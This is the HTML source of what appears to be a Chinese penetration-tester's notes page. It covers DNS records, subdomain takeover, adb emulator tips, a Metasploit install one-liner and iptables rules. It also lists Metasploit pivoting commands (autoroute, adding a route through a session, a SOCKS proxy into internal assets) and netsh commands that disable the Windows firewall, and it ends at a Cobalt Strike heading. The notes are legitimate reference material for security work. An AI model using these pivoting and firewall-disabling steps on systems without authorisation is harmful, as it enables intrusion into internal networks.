&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;记录类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;A-将域名指向一个IPV 4 地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CNAME-将域名指向另外一个域名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AAAA-将域名指向一个IPV 6 地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NS-将子域名指向其他DNS服务器解析&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MX-将域名执行邮件服务器地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SRV-记录提供特定服务的服务器&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（2）子域名接管&lt;/p&gt;
&lt;p&gt;A 域名通过 CNAME 解析到了 B 域名，而 B 域名又通过 CNAME 解析到了 C 域名，那么此时 A 域名是直接解析到了 C 域名下。如果 B 域名过期了且没有被注册，那么可以直接通过 B 域名来控制 A 域名的界面，因为 A 域名是一个更权威的界面，是更容易让人相信的。&lt;/p&gt;
&lt;h3 id=&#34;adb相关命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#adb相关命令&#34;&gt;#&lt;/a&gt; adb 相关命令&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;一般命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;adb devices&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;adb connect 127.0.0.1:5037&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;adb root shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;adb默认端口 5037 被占用的解决办法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;找到被哪个进程号占用了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netstat - ano | findstr 5037&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看此进程号是什么任务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tasklist | findstr 11111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;删除此进程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;taskkill /pid 11111&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;雷神模拟器的 adb shell 没有 root，可以先换逍遥或者 nox 尝试&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;逍遥模拟器命令 adb devices 查看设备，只显示 List of devices attached，设备列表显示为空&lt;br&gt;
①关闭任务管理器中的 adb.exe 关闭逍遥模拟器&lt;br&gt;
②打开 adb 目录，复制 adb.exe&lt;br&gt;
③打开逍目录下的 \Microvirt\MEmu\adb.exe 并备份，将复制的 adb.exe 粘贴&lt;br&gt;
④再次运行逍遥模拟器的虚拟机 adb devices 将成功显示设备列表&lt;/p&gt;
&lt;h3 id=&#34;linux-install-msf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux-install-msf&#34;&gt;#&lt;/a&gt; linux install msf&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;一键安装 msf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall &amp;amp;&amp;amp; chmod 755 msfinstall &amp;amp;&amp;amp; ./msfinstall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;判断msfconsole位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;whereis,type,which msfconsole&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;载入～/.bash_profile, 设置为全局&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export PATH=$PATH:[order location]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;win-install-mingw&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win-install-mingw&#34;&gt;#&lt;/a&gt; win install mingw&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装mingw包管理器：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://osdn.net/projects/mingw/downloads/68260/mingw-get-setup.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;装C、C++编译器：从 mingw-get 窗口左上角的安装菜单中选择应用更改&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;检验安装是否成功：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;C:\MinGW\bin\gcc.exe --version; C:\MinGW\bin\g++.exe --version&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;设置路径为全局路径:&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;C:\MinGW\bin\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;注意：g++会把.c和.cpp文件当作是C++的源程序进行编译；gcc会把.c当作是C源程序编译，.cpp的程序当作是C++源程序编译&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc test.c -o test; g++ test.c -o 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;msf中路由设置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf中路由设置&#34;&gt;#&lt;/a&gt; msf 中路由设置&lt;/h3&gt;
&lt;p&gt;路由添加&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看路由信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run autoroute -p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;添加路由&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/multi/manage/autoroute&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;添加指定路由， 1 是接收的session编号：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;route add 192.168.11.0 255.255.255.0 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Sock 代理&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use auxiliary/server/socks_proxy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set srvhost 0.0.0.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set srvport 1115 在外网服务器端口做了代理&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim /etc/proxychains外网服务器通过代理端口可以直接访问内网资产&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;防火墙规则设置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#防火墙规则设置&#34;&gt;#&lt;/a&gt; 防火墙规则设置&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Windows 防火墙命令：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdG9tdGVsbHlvdS9wLzE2MzAwNTU3Lmh0bWw=&#34;&gt;https://www.cnblogs.com/tomtellyou/p/16300557.html&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看当前防火墙状态&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netsh advfirewall show allprofiles&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;关闭防火墙&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netsh advfirewall set allprofiles state off&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;开启防火墙&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netsh advfirewall set allprofiles state on&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;恢复初始防火墙设置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netsh advfirewall reset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;启用桌面防火墙&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netsh advfirewall set allprofiles state on&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;设置默认输入和输出策略&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;如果设置为拒绝使用blockinbound,blockoutbound&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;iptables 规则设置&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt; /* 清除所有规则 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -F&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;/*允许包从 22 端口进入*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -A INPUT -p tcp --dport 22 -j ACCEPT &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;允许从 22 端口进入的包返回*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT /*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;/* 域名解析端口，一般不开 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -A OUTPUT -p udp --dport 53 -j ACCEPT &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -A INPUT -p udp --sport 53 -j ACCEPT &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;/*允许本机访问本机*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;/*允许所有IP访问 80 端口*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -A INPUT -p tcp -s 0/0 --dport 80 -j ACCEPT &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;/*保存配置*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables-save &amp;gt; /etc/sysconfig/iptables &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;/* 显示iptables列表 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -L &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;cs上线linux&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cs上线linux&#34;&gt;#&lt;/a&gt; cs 上线 linux&lt;/h3&gt;
